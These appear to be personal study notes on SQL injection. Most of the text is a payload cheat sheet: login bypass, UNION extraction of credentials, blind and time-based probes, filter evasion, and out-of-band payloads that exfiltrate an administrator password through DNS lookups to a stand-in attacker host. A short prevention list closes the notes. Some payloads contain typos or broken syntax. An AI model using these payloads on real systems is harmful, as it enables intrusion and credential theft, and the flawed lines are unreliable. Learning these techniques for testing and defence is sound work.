## What is SQL Injection?
Inserting SQL payload into input field to manipulate the queries that an application sends to its database

## Why does it matter?
- can read sensitive data from database
- can modify or delete data
- can bypass authentication entirely

## How does it work?
**There are multiple types of SQL injections**

**In band** 
Results returned directly in the application
2 types:
- Error bases
- Union based

**Blind SQL**
No result in response
2 types:
- Boolean based
- Time based

**Out of band**
Data is extracted via a seperate channel like DNS or HTTP requests, used when in-band and blind methods don't work

## Common payloads
- **Test fr vulnerability**: '
- **Bypass login**: ' OR 1=1--
- **Login as specific user**: user'--
- **Find number of columns**: ' ORDER BY 1--, ' ORDER BY 2--, ....[error when number of columns exceed]
EXCEPTION: incase of mysql: ' ORDER BY 1-- -
- **UNION to extract data**: ' UNION SELECT NULL, NULL-- [error when NULL!=number of columns]
**note**:it can add an extra row of NULLS, but that can cause null pointer exception in some apps.
[MSSQL]:' UNION SELECT NULL--
[Oracle]:' UNION SELECT NULL FROM DUAL--
[PostgreSQL]:' UNION SELECT NULL FROM (s1) as temp--
[MySQL]:' UNION SELECT NULL-- -
**[Replace NULL with 'a', to find column with useful datatype]**
- **Extract version:
[MSSQL/MySQL]:'UNION SELECT @@version--
[Oracle]:' UNION SELECT * FROM v$version
[PostgreSQL]:' UNION SELECT version()

**Many databases except Oracle has a set of views called 'information_schema'**
example: 
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL from information_schema.columns where table_name='user.abcd'--
'UNION SELECT username_abcd,passwd from user_abcd--
- **Boolean blind test**: ' AND 1=1-- (true); ' AND 1=2-- (false)
replace true and false conditions with payloads accordingly

EXAMPLE:
- ' AND (SELECT 'a' FROM users LIMIT 1)='a => TRUE means table named users exists
- ' AND (SELECT 'a' FROM users where username='admin')='a => TRUE means admin exists in users
- ' AND (SELECT 'a' FROM users where username='admin' and length(passwd>1)='a => gradually increase value to figure out password length
- ' AND (SELECT substr(password,[1],1) from users where usersname='ad')='[a] => bruteforce, using bombshell attack, and find out the password
[ use grep match for convinience, if a true statement shows "welcome back!" message on the page, add that ]
- **Error based attack**
   - Condition error/ boolean:
      payloads like: ' AND (SELECT CASE WHEN(1=2) THEN 1/0 ELSE 'a'END)='a
      => False contition => No error
   - via verbose SQL error message:
     syntax error: leaks full query in error message
     reveals: table/ column name, query structure, str vs int, etc
     **always comment out trail -- or #**
- **Time-based blind sql**:
[MSSQL] '; IF(condition) WAITFOR DELAY '0:0:10'--
[MySQL] '; SELECT IF(condition, SLEEP(10), NULL)--
[PostgreSQL] '; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--
[Oracle] '; SELECT CASE WHEN (condition) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
- **Blind SQL using out-of-band**
Forces the database to make a network request to an external server, controlled by the attacker
request itself means that the payload worked
can exfilterate the data in DNS lookup

FLOW:
Attacker injects payload > Database makes DNS lookup to attacker's server > attacker.burpcollaborator.net receives the request > Attacker sees the request knows injection worked > Data can be smuggled in the subdomain of the lookup

## DNS Trigger Payloads by Database

### MSSQL
- Basic DNS trigger
'; exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--

- Exfiltrate data in DNS lookup
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')--

### Oracle
- Basic DNS trigger
'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

- Exfiltrate data in DNS lookup
'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

### MySQL
- Basic DNS trigger (only works on Windows)
'; LOAD DATA LOCAL INFILE 'index.html' INTO TABLE table_name;--

- With outfile
'; SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\'--

**Note**: MySQL out of band is unreliable, time based blind is preferred for MySQL.

### PostgreSQL
- Basic DNS trigger
'; COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--

- Exfiltrate data
'; COPY (SELECT password FROM users WHERE username='administrator') TO PROGRAM 'nslookup '||password||'.BURP-COLLABORATOR-SUBDOMAIN'--

SQL injection does not only happen in login forms, it can appear anywhere user input reaches a database query

**SQL in different context
- &#x53; = S => &#x53ELECT
- SE/**/LECT
- SeLeCt
- UN/**/ION

## Prevention
- Use parameterised queries, never concatenate user input into SQL
- Use an ORM (Object Relational Mapper)
- Whitelist allowed input values where possible
- Least privilege: database user should only have permissions it needs



